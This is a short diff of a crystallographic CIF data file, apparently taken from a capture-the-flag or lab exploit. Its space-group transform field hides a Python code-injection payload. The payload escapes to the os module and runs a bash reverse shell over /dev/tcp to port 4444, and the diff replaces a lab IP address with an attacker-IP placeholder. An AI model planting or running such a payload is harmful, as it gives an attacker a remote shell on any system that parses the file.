@@ -80,7 +80,7 @@ _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in
 ) () 
 if d.__name__ == "BuiltinImporter"]
 [0].load_module("os")
-.system("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.16/4444 0>&1\'");
+.system("/bin/bash -c \'sh -i >& /dev/tcp/<Attacking Machine IP>/4444 0>&1\'");
 0,0,0'
 
 _space_group_magn.number_BNS  62.448
